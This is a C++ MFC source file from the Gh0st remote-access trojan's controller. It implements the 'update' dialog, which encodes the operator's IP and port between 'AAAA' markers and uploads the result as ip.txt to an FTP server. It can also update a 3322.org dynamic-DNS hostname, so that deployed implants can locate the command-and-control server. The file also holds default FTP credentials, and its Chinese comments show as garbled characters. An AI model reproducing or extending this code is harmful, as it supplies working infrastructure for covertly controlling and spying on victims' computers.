// UpdateDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "UpdateDlg.h"
#include <afxinet.h> //��ȡ��ҳ������Ҫ������ͷ�ļ�
#include <SHLWAPI.H>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern int base64_encode(const void *data, int size, char **str);
extern char* MyEncode(char *str);
/////////////////////////////////////////////////////////////////////////////
// CUpdateDlg dialog


CUpdateDlg::CUpdateDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CUpdateDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUpdateDlg)
	m_DnsUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "DNSUser", "3322");
	m_DnsPass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "DNSPassword", "3322");
	m_DnsDomain = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "DNSDomain", "3322.org");
	m_FtpIP = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "FTPIP", "192.168.0.104");
	m_FtpPass =((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "FTPPassword", "HClient");
	m_FtpPort =((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Update", "FTPPort", 21);
	m_FtpUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "FTPUser", "HClient");
	m_FtpUrl = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "FTPURL", "\\ip.txt");
	m_listen_port =((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Update", "ListenPort", "21");
	//}}AFX_DATA_INIT
}


void CUpdateDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUpdateDlg)
	DDX_Control(pDX, IDC_STATIC_FTP, m_ftp);
	DDX_Control(pDX, IDC_STATIC_3322, m_3322);
	DDX_Control(pDX, IDC_COMBO_FTPIP, m_Combo_FtpIP);
	DDX_Control(pDX, IDC_COMBO_DNSIP, m_Combo_DnsIP);
	DDX_Text(pDX, IDC_EDIT_DNSUSER, m_DnsUser);
	DDX_Text(pDX, IDC_EDIT_DNSPASS, m_DnsPass);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN, m_DnsDomain);
	DDX_Text(pDX, IDC_EDIT_FTPIP, m_FtpIP);
	DDX_Text(pDX, IDC_EDIT_FTPPASS, m_FtpPass);
	DDX_Text(pDX, IDC_EDIT_FTPPORT, m_FtpPort);
	DDV_MinMaxUInt(pDX, m_FtpPort, 0, 65500);
	DDX_Text(pDX, IDC_EDIT_FTPUSER, m_FtpUser);
	DDX_Text(pDX, IDC_FTPURL, m_FtpUrl);
	DDX_Text(pDX, IDC_COMBO_FTPPORT, m_listen_port);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUpdateDlg, CDialog)
	//{{AFX_MSG_MAP(CUpdateDlg)
	ON_BN_CLICKED(IDC_BTN_FTPUPDATE, OnBtnFtpupdate)
	ON_BN_CLICKED(IDC_BTN_DNSUPDATE, OnBtnDnsupdate)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUpdateDlg message handlers

void CUpdateDlg::OnBtnFtpupdate() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	//�������IP���˿���ϢΪ�ļ�------------------
	CString strIP;
	GetDlgItem(IDC_COMBO_FTPIP)->GetWindowText(strIP);   
	strIP.Replace(" ", "");	
    strIP+=":";
	strIP+=m_listen_port;	
    strIP.MakeLower();
	m_encode = MyEncode(strIP.GetBuffer(0));
	m_encode.Insert(0, "AAAA");
	m_encode += "AAAA";

	HANDLE hFile;
    hFile = CreateFile("ip.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD numWrite;
    WriteFile (hFile,m_encode,m_encode.GetLength(), &numWrite, NULL);	
	CloseHandle(hFile);
	
	//����������Ϣ
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "FTPIP", m_FtpIP);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "FTPUser",m_FtpUser);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "FTPPassword", m_FtpPass);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Update", "FTPPort", m_FtpPort);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "FTPURL", m_FtpUrl);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "ListenPort", m_listen_port);
		
	CreateThread(NULL,
		0,
		(LPTHREAD_START_ROUTINE)FtpUpdateThread,
		this,
		0,
		NULL);	
}

DWORD CUpdateDlg::FtpUpdateThread(void* pThis)
{
	return ((CUpdateDlg*)pThis)->FtpUpdate();
}

DWORD CUpdateDlg::FtpUpdate()
{
	//FTP�ϴ��ļ�---------------------------------
	CInternetSession *seu;
	CFtpConnection *pFTP;
	   //�½��Ի�
	seu=new CInternetSession(AfxGetAppName(),1,PRE_CONFIG_INTERNET_ACCESS);
	try 
	{ 
		//�½����Ӷ���
		pFTP=seu->GetFtpConnection(m_FtpIP,m_FtpUser,m_FtpPass,m_FtpPort,FALSE); 
	} 
	catch(CInternetException *pEx) 
	{
		//��ȡ����
		TCHAR szError[1024];
		if(pEx->GetErrorMessage(szError,1024))
			::MessageBox(NULL,szError,"FTP����",MB_ICONEXCLAMATION | MB_OK);
		else  
	    	::MessageBox(NULL,"���ӷ����쳣","FTP����",MB_ICONEXCLAMATION | MB_OK);
		pEx->Delete();
		pFTP=NULL;
		return 0;
	}
	//�ϴ������ļ�
	if(pFTP->PutFile("ip.txt",m_FtpUrl))
	{ 
		//�Զ��������óɹ���ʾ
		char Path[MAX_PATH];
		char offline[MAX_PATH];
		GetModuleFileName(NULL, Path, sizeof(Path));
		PathRemoveFileSpec(Path);
//		wsprintf(offline,"%s%s",Path,"\\sound\\Setting.wav");
		DWORD dwAttributes=GetFileAttributes(offline);
		if(dwAttributes != 0xffffffff)
		{
			sndPlaySound(offline, SND_ASYNC);
		}else{
            ::MessageBox(NULL,"����IP�ɹ�","FTP����", MB_OK);
		}		
	}	
	else
	  ::MessageBox(NULL,"����IPʧ��","FTP����",MB_ICONEXCLAMATION | MB_OK);
	
    pFTP->Close();	
	
	return 0;
}

void CUpdateDlg::OnBtnDnsupdate() 
{
	// TODO: Add your control notification handler code here
/*	UpdateData();
	if (m_DnsDomain.IsEmpty()||m_DnsUser.IsEmpty()||m_DnsPass.IsEmpty())
	{
		AfxMessageBox("����д��������Ϣ��");
		return;
	}
	CString m_IP;
	CString strURL;
	
	CInternetSession mySession1(NULL,0);   
	CHttpFile* myHttpFile=NULL;     
	
	strURL.Format("http://ip.3322.org");
	myHttpFile=(CHttpFile*)mySession1.OpenURL(strURL);   
	myHttpFile->ReadString(m_IP);   
	
	myHttpFile->Close();   
	mySession1.Close();
	//AfxMessageBox(m_IP);  //��ȡ��������IP
	
	CString strUrl,strTemp;
	strUrl = "http://";
	strUrl += m_DnsUser;
	strUrl +=":";
	strUrl +=m_DnsPass;
	strUrl +="@members.3322.org/dyndns/update?system=dyndns&hostname=";
	strUrl +=m_DnsDomain;
	strUrl +="&myip=";
	strUrl +=m_IP;
	strUrl +="&wildcard=OFF";
	
	AfxMessageBox(strUrl);
	
	CInternetSession m_Session(NULL,0);
	CHttpFile* pHttpFile=NULL;
	pHttpFile=(CHttpFile*) m_Session.OpenURL(strUrl);
	if(pHttpFile == NULL)
	{
		MessageBox("����IP����!","3322 Domain");
		pHttpFile->Close();
		m_Session.Close();
		return;
	}
	pHttpFile->ReadString(strTemp);	
	pHttpFile->Close();
	m_Session.Close();	
	MessageBox(strTemp,"3322����");*/

//////////////////��һ�ַ�ʽ����3322 ���ú�����һ��////////////////////////////////////////////////////////
	UpdateData();	
	CString strUpdate,strNewIP;
	m_Combo_DnsIP.GetLBText(m_Combo_DnsIP.GetCurSel(),strNewIP);
	
	strUpdate.Format("http://%s:%s@members.3322.org/dyndns/update?system=dyndns&hostname=%s&myip=%s&wildcard=OFF",
		m_DnsUser,m_DnsPass,m_DnsDomain,strNewIP);
	
	HINTERNET hNet = ::InternetOpen("3322",	// ��HTTPЭ��ʹ��ʱ������������⸳ֵ 
		PRE_CONFIG_INTERNET_ACCESS,		// ��������ָʾWin32���纯��ʹ�õǼ���Ϣȥ����һ���������� 
		NULL, 
		INTERNET_INVALID_PORT_NUMBER,	// ʹ��INTERNET_INVALID_PORT_NUMBER�൱���ṩȴʡ�Ķ˿����� 
		0								// ��־ȥָʾʹ�÷��ؾ���Ľ�����Internet������"��"Ϊ�ص���������״̬��Ϣ 
		) ; 
	
	HINTERNET hUrlFile = ::InternetOpenUrl(hNet,// ��InternetOpen���صľ�� 
		(char *)strUpdate.GetBuffer(MAX_PATH),	// ��Ҫ�򿪵�URL 
		NULL,							// ��������������Ͷ������Ϣ,һ��ΪNULL 
		0,								// ��������������Ͷ������Ϣ,һ��Ϊ 0 
		INTERNET_FLAG_RELOAD,			// InternetOpenUrl��Ϊ�ı�־ 
		0) ;							// ��Ϣ�����ᱻ�͵�״̬�ص����� 
	
	CString strMsg; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile,// InternetOpenUrl���صľ�� 
		strMsg.GetBuffer(MAX_PATH),		// �������ݵĻ����� 
		MAX_PATH, 
		&dwBytesRead);				// ָ��������뻺�����ֽ����ı�����ָ��; 
	
	//�������ֵ��TRUE����������ָ��0�����ļ��Ѿ��������ļ���ĩβ�� 
	
	::InternetCloseHandle(hUrlFile); 
	::InternetCloseHandle(hNet); 
	
    if(strMsg.Find("badauth") != -1)
	{
		::MessageBox(NULL,"�û������������\n�����Ƿ�������ȷ","���¶�̬����",MB_ICONEXCLAMATION | MB_OK);
	}
	else if(strMsg.Find("nohost") != -1)
	{
		::MessageBox(NULL,"DDNS����\n�����Ƿ�������ȷ","���¶�̬����",MB_ICONEXCLAMATION | MB_OK);
	}
	else if(strMsg.Find("good") != -1 || strMsg.Find("nochg") != -1)
	{
		//�Զ��������óɹ���ʾ
		char Path[MAX_PATH];
		char offline[MAX_PATH];
		GetModuleFileName(NULL, Path, sizeof(Path));
		PathRemoveFileSpec(Path);
//		wsprintf(offline,"%s%s",Path,"\\sound\\Setting.wav");
		DWORD dwAttributes=GetFileAttributes(offline);
		if(dwAttributes != 0xffffffff)
		{
			sndPlaySound(offline, SND_ASYNC);
		}else{
         ::MessageBox(NULL,"���¶�̬�����ɹ�\r","���¶�̬����",MB_OK);
		}		
	}
	else 
	{
		::MessageBox(NULL,"��̬�����������ڲ�����,���������","���¶�̬����",MB_ICONEXCLAMATION | MB_OK);		
	}
	strMsg.ReleaseBuffer();
	//����������Ϣ
   ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "DNSUser", m_DnsUser);
   ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "DNSPassword", m_DnsPass);
   ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Update", "DNSDomain", m_DnsDomain);
//////////////////////////////////////////////////////////////////////////
}

BOOL CUpdateDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	CRect rect;
	GetWindowRect(rect);
	rect.OffsetRect(0,0);
	MoveWindow(rect);
	CenterWindow();//ʹ��������ʱ������Ļ������
	AnimateWindow(GetSafeHwnd(),1000,AW_CENTER);//������ʽ�򿪴���

	CenterWindow();	
	m_3322.m_link = _T("http://www.pubyun.com/accounts/signup/");//����3322����������
	m_ftp.m_link = _T("http://free.5944.net/reg.asp");//����FTP������
	//���IP--------------------------------
	CString m_IP;

/*	CString strURL;	
	CInternetSession mySession(NULL,0);   
	CHttpFile* myHttpFile=NULL;     
	
	strURL.Format("http://ip.3322.org");//��ȡ����IP�����ھ�����
	myHttpFile=(CHttpFile*)mySession.OpenURL(strURL);   
	myHttpFile->ReadString(m_IP);	
	myHttpFile->Close();   
	mySession.Close();
	m_Combo_DnsIP.AddString(m_IP);
	m_Combo_FtpIP.AddString(m_IP);*/
	
	char szhostname[128];    
	if( gethostname(szhostname, 128) == 0 )
	{
		
		struct hostent * phost;
		int i,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( i = 0; phost!= NULL && phost->h_addr_list[i]!= NULL; i++) 
		{
			CString str;
			for( j = 0; j<h_length; j++ ) 
			{
				CString addr;			
				if( j > 0 )
					str += ".";			
				addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
				str += addr;
			}
			m_Combo_DnsIP.AddString(str);
			m_Combo_FtpIP.AddString(str);	
		}
		m_Combo_DnsIP.SetCurSel(0);
		m_Combo_FtpIP.SetCurSel(0);
	}
	
	//---------------------------
	UpdateData(FALSE);	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
